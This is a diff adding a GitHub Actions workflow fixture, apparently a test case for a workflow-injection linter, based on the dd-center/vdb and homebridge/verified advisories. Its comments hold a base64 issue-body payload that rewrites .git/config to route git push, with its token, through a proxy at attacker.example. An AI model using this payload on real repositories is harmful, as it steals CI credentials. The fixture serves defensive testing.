@@ -1,0 +1,54 @@
+# situation: on issues, a run starts node submitPr.js, a program of the
+#   repository, with the body of the issue in the variable ISSUE_BODY of env
+#   and a token that writes in GITHUB_TOKEN. This is the job publish of
+#   submit.yml of dd-center/vdb (commit
+#   06e81fc6aa74cb1c4bc3df9701c17c93f3a6991a, lines 1-4 and 45-64); the
+#   triggers push and pull_request, the jobs close and pr, and the step Push
+#   changes are left out. submitPr.js decodes commands from a block of the
+#   body, writes a file at join('vtbs', <path>) with a content that the block
+#   names, and then runs git push with the token in the URL of the remote.
+#   plugin-prechecks.yml of homebridge/verified (commit
+#   5674fc615f1f933322cfe6facb007caea366d59a, GHSL-2020-185) uses the local
+#   action ./precheck, a node action whose input body takes
+#   ${{ github.event.issue.body }} as its default; the JavaScript of the
+#   action runs npm install with the name of a package that it reads from the
+#   body, so the install scripts of the package run with the token of the
+#   job.
+# reason: a limitation (run time): what the program does with the value is in
+#   the code of the program, and the run script only passes the value as data.
+# cause: the rule reads the scripts of runs and of actions/github-script, not
+#   the code of other programs.
+# attack-value: github.event.issue.body = "-----BEGIN SUBMIT BLOCK-----cHV0OkxpNHZMbWRwZEM5amIyNW1hV2M9OlcyaDBkSEJkQ2dsd2NtOTRlU0E5SUdoMGRIQTZMeTloZEhSaFkydGxjaTVsZUdGdGNHeGxPamd3T0RBSw==-----END SUBMIT BLOCK-----"
+# attack-run-behavior: the block decodes to put:<path>:<content>, where the
+#   path is ../.git/config and the content is an [http] section with proxy =
+#   http://attacker.example:8080. submitPr.js writes the content to
+#   .git/config, and its git push sends the URL of the remote, which holds the
+#   token in secrets.gtoken, through the proxy of the attacker. No run script
+#   reads the value as code.
+# advisory: https://securitylab.github.com/advisories/GHSL-2020-195-dd-center-vdb-workflow/
+# advisory: https://securitylab.github.com/advisories/GHSL-2020-185-homebridge-verified-workflow/
+name: Submit Branch
+on:
+  issues:
+    types: [opened, reopened]
+jobs:
+  publish:
+    if: github.event_name == 'issues'
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v1
+
+    - name: Use Node.js 13
+      uses: actions/setup-node@v1
+      with:
+        node-version: '13'
+
+    - name: npm install
+      run: npm install
+
+    - name: Commit Branch
+      run: node submitPr.js
+      env:
+        ISSUE_NUMBER: ${{ github.event.issue.number }}
+        ISSUE_BODY: ${{ github.event.issue.body }}
+        GITHUB_TOKEN: ${{ secrets.gtoken }}
